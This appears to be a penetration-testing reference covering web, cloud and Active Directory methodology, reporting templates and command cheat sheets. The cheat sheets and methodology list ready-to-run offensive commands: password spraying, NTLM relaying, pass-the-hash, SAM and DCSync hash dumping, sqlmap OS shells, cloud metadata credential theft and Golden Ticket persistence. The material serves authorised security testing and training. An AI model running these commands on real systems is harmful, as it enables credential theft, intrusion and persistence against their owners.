Web Application Pentest

OWASP Aligned
Methodology
01 Reconnaissance & Scope Definition Passive intel gathering before touching the target ‚ñæ
  • Confirm scope: domains, IP ranges, out-of-scope assets, rules of engagement
  • Passive DNS: Enumerate subdomains without direct contact (crt.sh, Shodan, OSINT)
  • Tech fingerprinting: Identify frameworks, CMS, server headers, CDN via Wappalyzer / WhatWeb
  • Google dorks: Find exposed panels, error pages, backup files, sensitive params
  • Map third-party integrations: payment gateways, OAuth providers, API backends
  • Review JavaScript files for hidden endpoints, tokens, and internal hostnames
02 Discovery & Attack Surface Mapping Active crawling, directory brute-force, endpoint enumeration ‚ñæ
  • Spider/crawl the target in Burp Suite to capture all requests
  • Directory & file brute-force with ffuf / feroxbuster using SecLists wordlists
  • Parameter discovery: arjun, x8 ‚Äî find hidden GET/POST parameters
  • JS link extraction: LinkFinder / subjs to pull API routes from scripts
  • Identify input surfaces: forms, file uploads, search fields, headers (Host, X-Forwarded-For)
  • Map authentication flows: login, registration, password reset, MFA bypass paths
03 Vulnerability Assessment Identify and confirm exploitable weaknesses across OWASP Top 10 ‚ñæ
  • Injection: SQL injection (manual + sqlmap), XSS (reflected/stored/DOM), SSTI, command injection, XXE
  • Auth flaws: Broken auth, JWT tampering, session fixation, insecure password reset tokens
  • IDOR & BOLA: Object-level auth bypass ‚Äî change IDs in requests, check responses for cross-user data
  • SSRF: Internal network access via user-controlled URLs ‚Äî probe for cloud metadata endpoints
  • File upload: Extension bypass, MIME type confusion, path traversal, stored XSS via SVG
  • Misconfiguration: CORS wildcard, verbose error messages, exposed admin paths, default credentials
  • Business logic: price manipulation, coupon stacking, workflow skipping, mass assignment
04 Exploitation & Impact Demonstration Prove exploitability with minimal footprint ‚ñæ
  • Exploit confirmed vulnerabilities to demonstrate real-world impact ‚Äî no destructive actions
  • Chain vulnerabilities for escalated impact (e.g. SSRF ‚Üí IDOR ‚Üí data exfil)
  • Capture screenshots and request/response pairs as evidence for each finding
  • Test privilege escalation: horizontal (access other users' data) and vertical (escalate to admin)
  • Session token analysis: entropy, duration, revocation on logout
  • Document CVSS score estimate and business impact for each finding
05 Reporting & Remediation Guidance Clear findings with actionable fixes ‚ñæ
  • Structure: Executive Summary ‚Üí Scope ‚Üí Risk Ratings ‚Üí Findings ‚Üí Remediation ‚Üí Appendix
  • Each finding: title, severity (Critical/High/Medium/Low/Info), description, PoC steps, evidence, recommendation
  • Prioritise by exploitability √ó business impact ‚Äî not just CVSS score
  • Include code-level fixes where possible (sanitise input, parameterised queries, etc.)
  • Follow-up retest: verify each remediation was correctly applied

Cloud Penetration Testing

AWS ¬∑ Azure ¬∑ GCP
Always confirm scope for cloud. Cloud pentests require explicit written authorisation from the cloud provider in addition to the client's permission. AWS, Azure, and GCP each have their own penetration testing policy ‚Äî read them before testing.
Methodology
01 Enumeration & Initial Recon Identity, permissions, and resource discovery ‚ñæ
  • Confirm which cloud provider(s) and services are in scope
  • Enumerate IAM principals: users, roles, groups, service accounts
  • Check for exposed credentials: .env files, S3 bucket listings, public repos, metadata endpoints
  • AWS: aws sts get-caller-identity to confirm your identity; aws iam list-users, list-roles
  • Azure: az account show, az ad user list, az role assignment list
  • GCP: gcloud auth list, gcloud projects list, gcloud iam service-accounts list
  • Discover storage: S3 buckets, Azure blobs, GCS buckets ‚Äî check for public read/write access
02 Privilege Escalation & Lateral Movement Escalate from low-priv credentials to admin / root ‚ñæ
  • Map attached policies ‚Äî identify wildcards, overly permissive actions (* on iam:*, s3:*)
  • AWS PrivEsc: iam:PassRole, iam:CreatePolicy, sts:AssumeRole chains; Lambda/EC2 role abuse
  • IMDS abuse: From inside an EC2/VM, curl 169.254.169.254/latest/meta-data/iam/security-credentials/ for temp keys
  • Check for cross-account trust relationships and assume-role chains
  • Identify misconfigured security groups: 0.0.0.0/0 on ports 22, 3389, 6379, 9200
  • Test for exposed secrets in environment variables, user-data scripts, and SSM Parameter Store
03 Data Exposure & Persistence Identify data at risk and persistence mechanisms ‚ñæ
  • Audit public storage buckets for sensitive data (keys, PII, backups, DB dumps)
  • Check snapshot visibility: publicly shared EBS snapshots, RDS snapshots, AMIs
  • Look for unencrypted S3 buckets, RDS instances without encryption at rest
  • Persistence: backdoor IAM user, add access key to existing user, create Lambda persistence
  • Review CloudTrail / Azure Monitor / GCP Audit Logs for gaps or disabled logging
  • Check for exposed Kubernetes API server (EKS, AKS, GKE) ‚Äî kubectl auth can-i --list

Active Directory Pentest

Internal / On-Prem
Methodology
01 Initial Foothold Gain first credentials or domain access ‚ñæ
  • LLMNR/NBT-NS poisoning with Responder to capture NTLMv2 hashes
  • Password spray against SMB / OWA / VPN portals ‚Äî low & slow to avoid lockout
  • Anonymous/null SMB session enumeration: shares, users, policies without credentials
  • AS-REP Roasting: target accounts with pre-auth disabled ‚Äî no creds required
  • Phishing / initial access simulation (if in scope): deliver payload, capture beacon
  • Check for default credentials on network services: printers, IPMI, web panels
02 Domain Enumeration Map the domain from low-priv user context ‚ñæ
  • BloodHound + SharpHound: collect all domain objects, build attack path graph
  • PowerView: enumerate users, groups, computers, GPOs, OUs, ACLs, trusts
  • Identify privileged groups: Domain Admins, Enterprise Admins, Account Operators, Backup Operators
  • Find Kerberoastable accounts: SPNs set on user accounts with weak passwords
  • Map Group Policy: find policies deploying scripts, mapped drives, push credentials
  • Identify unconstrained, constrained, and resource-based constrained delegation
  • Check for LAPS deployment gaps ‚Äî computers without LAPS still use shared local admin passwords
03 Lateral Movement Move from low-priv host to high-value targets ‚ñæ
  • Pass-the-Hash: use NTLM hash without cracking ‚Äî access SMB, WMI, PSExec, WinRM
  • Pass-the-Ticket: inject Kerberos TGT/TGS to access services as another user
  • Overpass-the-Hash: convert NTLM hash ‚Üí Kerberos TGT for more stealthy access
  • WMI / PSExec / WinRM lateral movement from admin credentials
  • DCOM lateral movement: stealthier than PSExec, bypasses many EDR detections
  • Harvest credentials from memory (Mimikatz), registry (SAM), DPAPI blobs, cached hashes
  • Token impersonation: steal tokens of higher-priv processes on a compromised host
04 Privilege Escalation to Domain Admin Escalate to full domain compromise ‚ñæ
  • Kerberoasting: crack TGS tickets for SPN accounts offline with hashcat
  • AS-REP Roasting: crack hashes for accounts with pre-auth disabled
  • DCSync: if you have DS-Replication rights, dump all hashes remotely via impacket secretsdump
  • Unconstrained Delegation: capture TGT from any connecting admin, use for DA impersonation
  • ACL abuse: WriteDACL, GenericAll, ForceChangePassword ‚Äî escalate via ACE misconfigurations
  • Golden Ticket: forge TGTs with compromised KRBTGT hash ‚Äî 10-year persistence
  • Silver Ticket: forge TGS for specific service using computer account or service hash
  • PrinterBug / PetitPotam: force DC authentication, capture + relay to achieve DA

Reporting

Structure ¬∑ Severity ¬∑ Remediation
Report Structure
01
Executive Summary ‚Äî 1‚Äì2 page non-technical overview: overall risk posture, most critical findings, business impact. Written for the CISO and board, not the technical team.
02
Scope & Methodology ‚Äî Targets in scope, testing period, methodology used (black/grey/white box), tools, limitations, and any testing constraints.
03
Risk Rating Summary ‚Äî Table of all findings by severity (Critical / High / Medium / Low / Informational) with counts and overall risk rating.
04
Technical Findings ‚Äî One section per vulnerability: title, severity, CVSS score, description, proof of concept steps, evidence (screenshots), affected asset, and specific remediation recommendation.
05
Remediation Roadmap ‚Äî Prioritised fix list: Critical and High findings first, grouped by team/system responsible. Include short-term mitigations and long-term fixes separately.
06
Appendix ‚Äî Full tool output, raw scan results, network diagrams, credential evidence (hashed), and any additional technical detail too long for main findings.
Finding Template
Every finding needs these fields: Title ¬∑ Severity (Critical/High/Medium/Low/Info) ¬∑ CVSS Score ¬∑ CWE/CVE reference ¬∑ Affected asset ¬∑ Description ¬∑ Root cause ¬∑ PoC steps ¬∑ Evidence ¬∑ Impact ¬∑ Recommendation ¬∑ References.

Cheat Sheets

Quick Reference
Click Copy on any block to copy the commands. Replace TARGET, USER, HASH, and DOMAIN with your actual values.
Nmap
Discovery & Scanning 
# Host discovery (no port scan)
nmap -sn 192.168.1.0/24

# Fast top-1000 ports SYN scan
nmap -sS -T4 --open TARGET

# Full port scan with service/version detection
nmap -sS -p- -sV -sC -T4 -oA nmap_full TARGET

# UDP top-100 ports (slow, run after TCP)
nmap -sU --top-ports 100 -T3 TARGET

# Vulnerability scripts against open ports
nmap -sV --script=vuln TARGET

# SMB enumeration
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 TARGET

# Output all formats (for reporting)
nmap -sS -p- -sV -sC -oA scan_results TARGET
ffuf ‚Äî Web Fuzzing
Directory & Parameter Fuzzing 
# Directory brute-force
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Filter by status code (show only 200, 301, 302)
ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302

# Filter by response size (hide 4096-byte false positives)
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 4096

# Vhost discovery
ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w subdomains.txt -fs 1234

# GET parameter fuzzing
ffuf -u "http://TARGET/page?FUZZ=value" -w params.txt -mc 200

# POST body fuzzing (JSON)
ffuf -u http://TARGET/api/login -X POST -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"password"}' -w users.txt

# Recursive directory scan
ffuf -u http://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 3
CrackMapExec
SMB / WinRM Lateral Movement 
# Test credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u USER -p PASSWORD

# Pass-the-Hash authentication
crackmapexec smb TARGET -u USER -H HASH

# Enumerate shares
crackmapexec smb TARGET -u USER -p PASSWORD --shares

# Dump SAM hashes (local admin required)
crackmapexec smb TARGET -u USER -p PASSWORD --sam

# Run a command
crackmapexec smb TARGET -u USER -p PASSWORD -x "whoami /all"

# WinRM shell
crackmapexec winrm TARGET -u USER -p PASSWORD -x "ipconfig"

# Password spray (1 password, many users) ‚Äî go slow to avoid lockout
crackmapexec smb TARGET -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success
Responder & NTLM Relay
LLMNR Poisoning + Relay 
# Start Responder on your interface (captures NTLMv2 hashes)
responder -I eth0 -wdPv

# Responder logs go to /usr/share/responder/logs/
# Crack captured hash with hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# For relay (disable SMB/HTTP in Responder.conf first, then run in parallel):
# 1. Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -wdPv

# 2. Run ntlmrelayx targeting hosts without SMB signing
impacket-ntlmrelayx -tf targets.txt -smb2support -l loot/

# Find hosts without SMB signing (relay targets)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
Impacket Suite
AD Attacks & Remote Access 
# DCSync ‚Äî dump domain hashes (requires DS-Replication right)
impacket-secretsdump DOMAIN/USER:PASSWORD@DC_IP

# DCSync with hash
impacket-secretsdump -hashes :HASH DOMAIN/USER@DC_IP

sqlmap ‚Äî Common Flags 
# Test a GET parameter
sqlmap -u "http://TARGET/page?id=1" --dbs

# Test POST request (copy request from Burp to file)
sqlmap -r request.txt --dbs --level=3 --risk=2

# Dump a specific table
sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --dump

# Use a session cookie
sqlmap -u "http://TARGET/page?id=1" --cookie "session=COOKIE" --dbs

# WAF bypass tamper scripts

sqlmap -u "http://TARGET/page?id=1" --os-shell
Hashcat ‚Äî Hash Modes
Common Hash Types 
# NTLM (Windows local hash)
hashcat -m 1000 hashes.txt rockyou.txt

# NTLMv2 / Net-NTLMv2 (captured by Responder)
hashcat -m 5600 ntlmv2.txt rockyou.txt

# Kerberos TGS (Kerberoasting)
hashcat -m 13100 kerberoast.txt rockyou.txt

# Kerberos AS-REP (AS-REP Roasting)
hashcat -m 18200 asrep.txt rockyou.txt

# WPA2 PMKID + EAPOL
hashcat -m 22000 capture.hc22000 rockyou.txt

# MD5
hashcat -m 0 hashes.txt rockyou.txt

# SHA-256
hashcat -m 1400 hashes.txt rockyou.txt

# Rule-based attack (add number/symbol mutations)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8-char password: uppercase + lowercase + digit)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d
